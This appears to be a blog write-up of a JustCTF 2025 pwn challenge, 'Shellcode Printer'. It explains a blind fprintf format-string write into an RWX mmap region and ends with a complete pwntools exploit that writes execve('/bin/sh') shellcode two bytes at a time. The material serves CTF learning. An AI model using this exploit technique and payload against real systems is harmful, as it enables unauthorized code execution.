---
layout: default
title: "JustCTF 2025 Pwn Writeups"
description: "Writeups of JustCTF 2025 pwn challenges."
og_description: "Writeups of pwn challenges."
og_type: "ctf writeup"
keywords: "writeups,Sarvesh Aadhithya,CTFs, JustCTF, 2025,zoozoo-sec, zoozoo"

permalink: /writeups/JustCTF2025/
---

<!-- Link Bootstrap CSS (add this to your <head> if it's not already included) -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/themes/prism-tomorrow.min.css" integrity="sha512-kSwGoyIkfz4+hMo5jkJngSByil9jxJPKbweYec/UgS+S1EgE45qm4Gea7Ks2oxQ7qiYyyZRn66A9df2lMtjIsw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<link rel="stylesheet" href="{{ '/writeups/writeup-page.css' | relative_url }}" />

<section id="back" class="back">
<div id="challenge-links">
        <h1 class="text"><code>
JustCTF 2025</code></h1>
        <ul>
            <li><a href="#shellcodeprinter"><code>Shellcode Printer</code></a></li>
            <li><a href="#babyheap"><code>Baby Heap</code></a></li>
            <li><a href="#prospector"><code>Prospector</code></a></li>
        </ul>
    </div>
</section>

<section id="back">
<section id="blueback" class="container">
    <div id="shellcodeprinter" class="challenge-section">
        <div class="section-content">
            <b>Name:</b> <span class="text"> Shellcode Printing</span><br>
            <b>Category:</b> Binary Exploitation<br>
            <p><br>
                Here we are again — classic shellcode injection challenge... or is it?<br>
                This one isn’t the "copy-paste shellcode into a buffer and pray" kind of gig.<br>
                Instead of handing us a nice, friendly buffer and saying, <code>“Please inject shellcode here”</code>, this binary decided to play tricks with a format string vulnerability.
            </p>
        </div>
        <div class="section-content">
            <h1>Format String Shenanigans</h1>
            <img src="{{ '/writeups/JustCTF2025/assets/shellcodeprinter.png' | relative_url }}" alt="snippet" class="code-screenshot" />
            <p>
                You’d expect this to be your average <code>printf</code>-style info leak, right?<br>
                Surprise — it’s <code>fprintf()</code> to <code>/dev/null</code>. Yep, all output gone. Poof.<br>
                Any attempt to <code>%p</code>, <code>%s</code>, <code>%n</code>, or <code>%lx</code> your way to memory leaks? Straight into the void.
            </p>
            <p>
                But hold up… just because we can't read, doesn’t mean we can’t write.<br>
                That’s where the beauty lies — <code>fprintf()</code> + format string = write-what-where primitive.<br>
                (Just don’t expect it to hold your hand.)
            </p>
        </div>
        <div class="section-content">
            <h4>Enter mmap()</h4>
            <p>
                So, where are we even writing this shellcode to?<br>
                This binary uses <code>mmap()</code> to allocate a memory region — with RWX permissions — and stores the pointer on the stack.<br>
                Lucky for us, it’s just sitting at <code>rsp + 8</code>, waiting to be used.
            </p>
        </div>
        <div class="section-content">
            <h4>But There’s a Twist…</h4>
            <p>
                You don't get to write the whole shellcode in one go. Why?<br>
                Because this binary is a little extra.<br>
                After each input, the pointer into the <code>mmap</code>’d region gets bumped by 2 bytes.<br>
                So yeah — your write is 2 bytes per input.
            </p>
            <p>
                Still manageable.<br>
                Bonus: The input loop continues until you send a null byte.<br>
                So you can inject shellcode chunks, 2 bytes at a time, with each input round.
            </p>
        </div>
        <div class="section-content">
            <h4>And Then… It Breaks.</h4>
            <p>
                Just as you're about to finish writing your shellcode, the pointer ends up pointing to the end of the mmap'd region.<br>
                When the execution jumps to that pointer — it’s basically trying to run off the end of your shellcode.<br>
                That’s no good.
            </p>
        </div>
        <div class="section-content">
            <h4>The Jump Trick</h4>
            <p>
                Here’s the trick:<br>
                Write a <code>jmp</code> instruction at the end — one that jumps back to the start of your shellcode.<br>
                Since <code>jmp</code> is only 2 bytes (opcode + offset), and the pointer increments by 2 bytes per input, you can place it precisely.<br>
                For this one, we cheat a little — write 3 bytes to land the jump.<br>
                And just like that, execution jumps to the start — and we get the shell.
            </p>
        </div>
        <div class="section-content">
            <div class="h4-wrapper">
                <h4>Exploit Script</h4>
                <button class="copy-btn">Copy</button>
            </div>
<pre><code class="language-python">from pwn import *
import struct

context.arch = "amd64"
context.log_level = "info"

def split_shell(shellcode):
    chunks = [shellcode[i:i+2] for i in range(0, len(shellcode), 2)]
    words = []
    for chunk in chunks:
        if len(chunk) < 2:
            chunk += b'\x00'
        val = struct.unpack('&lt;H', chunk)[0]
        words.append(val)
    return words

def build_fmt_payload(value, offset=6):
    return f"%{value}c%{offset}$hn"

def generate_shellcode():
    return asm('''
        start:
            xor rax, rax
            push rax
            push rax
            pop rsi
            pop rdx
            mov rbx, 0x68732f6e69622f2f
            shr rbx, 8
            push rbx
            mov rdi, rsp
            mov al, 59
            syscall
            nop
            nop
            jmp start
    ''')

def exploit():
    io = process("./shellcode_printer_patched")

    raw_shellcode = generate_shellcode()
    shellcode_to_send = raw_shellcode[:-3]
    splitted = split_shell(shellcode_to_send)

    for i, word in enumerate(splitted):
        fmt = build_fmt_payload(word)
        log.info(f"Sending chunk {i+1}/{len(splitted)}: {fmt}")
        io.sendline(fmt.encode())

    # Final jump back to start
    io.sendline(b"%14674832c%6$n")

    # Null terminator
    io.sendline(b"\x00")
    io.interactive()

if __name__ == "__main__":
    exploit()</code></pre>
        </div>
    </div>
</section>
</section>



<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/prism.min.js" integrity="sha512-UOoJElONeUNzQbbKQbjldDf9MwOHqxNz49NNJJ1d90yp+X9edsHyJoAs6O4K19CZGaIdjI5ohK+O2y5lBTW6uQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/components/prism-python.min.js" integrity="sha512-3qtI9+9JXi658yli19POddU1RouYtkTEhTHo6X5ilOvMiDfNvo6GIS6k2Ukrsx8MyaKSXeVrnIWeyH8G5EOyIQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/components/prism-c.min.js" integrity="sha512-EWIJI7uQnA8ClViH2dvhYsNA7PHGSwSg03FAfulqpsFiTPHfhdQIvhkg/l3YpuXOXRF2Dk0NYKIl5zemrl1fmA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="{{ '/writeups/copy.js' | relative_url }}"></script>
